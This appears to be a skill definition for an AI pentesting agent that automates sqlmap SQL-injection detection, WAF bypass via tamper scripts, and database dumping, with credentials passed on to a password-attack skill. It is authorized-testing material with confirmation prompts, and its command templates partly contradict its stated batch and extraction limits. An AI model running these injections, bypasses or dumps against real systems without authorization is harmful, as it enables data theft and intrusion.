---
name: sql-injector
description: Detect and exploit SQL injection vulnerabilities using sqlmap. Given a web request with potentially injectable parameters, automate the detection, fingerprinting, and data extraction process. Use after web-path-finder or service-enumerator has identified forms, API endpoints, or URL parameters that may be vulnerable.
license: MIT
compatibility: Requires sqlmap. Optional: curl for request crafting, python3 for custom tamper scripts.
metadata:
  bundle: network-discovery
  version: "1.0"
---

Automate SQL injection testing against web endpoints. This skill is for AUTHORIZED testing only — the operator MUST have explicit written permission. The skill enforces a pre-flight confirmation prompt before any injection attempt.

Output uses the standard envelope from [OUTPUT_SCHEMAS.md](../network-discovery/OUTPUT_SCHEMAS.md) and adds SQL-injection-specific shapes documented below.

---

## Inputs

| Name | Type | Default | Notes |
| --- | --- | --- | --- |
| `target_url` | string | — | Full URL to test, including query string parameters if GET method. |
| `method` | string | `"get"` | HTTP method: `get`, `post`, `put`, or `custom` (when using a request file). |
| `data` | string | `""` | POST body (for POST/PUT methods). Form-encoded or JSON. |
| `headers` | object | `{}` | Additional HTTP headers as key-value pairs, e.g. `{"Authorization": "Bearer ...", "Cookie": "session=..."}`. |
| `param` | string | all params | Specific parameter to test. When omitted, test all parameters. |
| `techniques` | string | `"BEUSTQ"` | SQLi techniques to attempt. Ordered characters: `B`(oolean blind), `E`(rror-based), `U`(nion query), `S`(tacked queries), `T`(ime-based blind), `Q`(inline queries). Default = all. |
| `dbms` | string | `null` | Force specific DBMS fingerprinting (`mysql`, `mssql`, `postgresql`, `oracle`, `sqlite`, `firebird`, `access`, `db2`). When null, auto-detect. |
| `level` | int | `3` | Test intensity (1–5). Level 1 is fast but may miss certain techniques. Level 5 sends more payloads and is comprehensive but slow. |
| `risk` | int | `2` | Risk of payload (1–3). Risk 1 is safe (no heavy `OR` time-based blind). Risk 3 includes heavy payloads that may cause DoS. |
| `batch` | bool | `false` | If `true`, run non-interactively (sqlmap `--batch`). Default `false` requires operator confirmation per finding. |
| `extract_data` | bool | `false` | If `true`, attempt to enumerate databases, tables, and dump rows. DANGEROUS — only use with explicit authorization. |
| `threads` | int | `1` | Thread count for data extraction phase. |
| `timeout_seconds` | int | `600` | Max total runtime (10 min default — sqlmap can run for hours on deep tests). |
| `request_file` | string | `null` | Path to a raw HTTP request file (for `method=custom`). Useful for complex authenticated requests captured via Burp. |
| `tamper_scripts` | string | `null` | Comma-separated sqlmap tamper script names, e.g. `"space2comment,between,randomcase"`. Used for WAF bypass. |

---

## Pre-flight authorization check

Before ANY injection attempt:

1. Display the target URL, parameters being tested, and all technique flags.
2. Require explicit confirmation: `"This will send SQL injection payloads to <target_url> testing parameter(s) <params> using techniques <techniques>. You have written authorization for this testing? (yes/no)"`
3. Only proceed on literal `yes`. Anything else aborts.

---

## Invocation

### Basic GET test

```sh
sqlmap -u "<target_url>" \
  -p <param> \
  --technique=<techniques> \
  --level=<level> \
  --risk=<risk> \
  --batch \
  --output-dir=/tmp/sqlmap-<target>/ \
  --tamper=<tamper_scripts> \
  --random-agent \
  --time-sec=5
```

Omitting `--batch` when `batch=false` allows sqlmap to prompt the operator interactively (which the agent passes through).

### POST test

```sh
sqlmap -u "<target_url>" \
  --data="<data>" \
  -p <param> \
  --technique=<techniques> \
  --level=<level> \
  --risk=<risk> \
  --batch \
  --output-dir=/tmp/sqlmap-<target>/ \
  --tamper=<tamper_scripts> \
  --random-agent
```

### Authenticated request (request file)

```sh
sqlmap -r <request_file> \
  -p <param> \
  --technique=<techniques> \
  --level=<level> \
  --risk=<risk> \
  --batch \
  --output-dir=/tmp/sqlmap-<target>/ \
  --tamper=<tamper_scripts>
```

### Data extraction (when `extract_data=true`)

```sh
sqlmap -u "<target_url>" \
  --data="<data>" \
  --dbms=<dbms> \
  --technique=<techniques> \
  --level=<level> \
  --risk=<risk> \
  --batch \
  --output-dir=/tmp/sqlmap-<target>/ \
  --tamper=<tamper_scripts> \
  --threads=<threads> \
  --dbs \
  --tables \
  --dump
```

---

## Output — SqlInjectionFinding

```json
{
  "endpoint": {
    "url": "https://example.com/page.php",
    "method": "GET",
    "parameter": "id",
    "parameter_type": "numeric"
  },
  "vulnerable": true,
  "techniques": ["boolean_blind", "error_based", "time_based"],
  "dbms": "MySQL",
  "dbms_version": ">= 5.5",
  "payload": "id=1 AND 1=1",
  "extracted_info": {
    "databases_found": 3,
    "database_names": ["information_schema", "wordpress", "mysql"],
    "tables_in_wordpress": 12,
    "rows_extracted": 0
  },
  "severity": "critical",
  "impact": "Complete database read access. Can extract user credentials, session tokens, and sensitive data.",
  "remediation": "Use prepared statements / parameterized queries for all database access. Validate and sanitize the 'id' parameter."
}
```

The merged envelope:

```json
{
  "skill": "sql-injector",
  "target_url": "https://example.com/page.php?id=1",
  "started_at": "2026-06-10T12:00:00Z",
  "finished_at": "2026-06-10T12:15:30Z",
  "result": {
    "findings": [
      {
        "endpoint": { "url": "https://example.com/page.php", "parameter": "id" },
        "vulnerable": true,
        "techniques": ["boolean_blind", "error_based"],
        "dbms": "MySQL 8.0",
        "severity": "critical",
        "payload": "id=1 AND (SELECT 1 FROM DUAL WHERE 1=1)",
        "impact": "Database read access. 3 databases, 12 tables in wordpress.",
        "remediation": "Parameterized queries."
      }
    ],
    "summary": {
      "parameters_tested": 1,
      "vulnerable": 1,
      "techniques_successful": ["boolean_blind", "error_based"],
      "dbms_detected": "MySQL 8.0",
      "data_extracted": false,
      "extraction_requested": false,
      "elapsed_seconds": 210
    }
  },
  "errors": []
}
```

---

## Failure paths

| Condition | Behavior |
| --- | --- |
| `sqlmap` not found | Fatal `missing_binary`. Install hint: `brew install sqlmap` (macOS), `apt install sqlmap` (Debian/Ubuntu), or `pip3 install sqlmap`. |
| Target unreachable | Fatal — host is down; do not attempt injection. |
| No injectable parameter found | Report "no vulnerabilities detected" with the list of parameters tested. This is valid output. |
| SQLmap times out on a specific technique | Note the timeout in `errors[]` and continue to the next technique or parameter. |
| WAF blocks all requests | Report WAF presence and detection method (e.g. "ModSecurity: blocked 100% of test payloads"). If `tamper_scripts` provided, retry with them. |

---

## WAF detection and bypass

When the initial probes return 403/406/429 for test payloads:

1. Attempt to identify the WAF via response headers (`Server`, `X-Sucuri-ID`, `CF-Ray`, `X-Powered-By`, `x-amz-id-2`).
2. Report the WAF type in the findings.
3. If `tamper_scripts` are provided, retry with the first tamper script.
4. If not provided, suggest tamper scripts for the detected WAF:
   - Cloudflare: `tamper_scripts="space2comment,randomcase,between"`
   - ModSecurity: `tamper_scripts="between,charencode,charunicodeencode"`
   - AWS WAF: `tamper_scripts="between,randomcase,charencode"`
   - Generic WAF: `tamper_scripts="space2comment,between,randomcase"`

---

## Chaining with other skills

`sql-injector` output feeds naturally into:
- `password-attacker` — extracted database credentials can be tested against other services
- `exploit-correlator` — SQLi findings map to MITRE ATT&CK T1190 (Exploit Public-Facing Application)
- `assessment-report` — SQLi findings are always critical severity

---

## Ethical guardrails

- `extract_data=true` requires a SECOND confirmation prompt beyond the pre-flight authorization check.
- Never run with `risk=3` against production DBMS without emergency authorization — heavy payloads can crash database backends.
- Data extraction is scoped to schema discovery only unless the operator explicitly authorizes row-level extraction.
- All sqlmap output files are written to `/tmp/sqlmap-<target>/` and cleaned up after the skill completes, except for extracted data which is copied to `./reports/sqli-data-<target>-<timestamp>.json`.

---

## Example invocations

```
sql-injector: target_url=https://example.com/page.php?id=1
sql-injector: target_url=https://example.com/search, method=post, data="q=test", param=q
sql-injector: target_url=https://example.com/api/users/1, method=get, techniques=EU, level=5, risk=3
sql-injector: target_url=https://example.com/products?id=1, dbms=mssql, tamper_scripts=space2comment,between,randomcase
sql-injector: target_url=https://wordpress.site/wp-admin/admin-ajax.php, data="action=wp_ajax_search&q=test", headers={"Cookie":"wordpress_logged_in=..."}
```
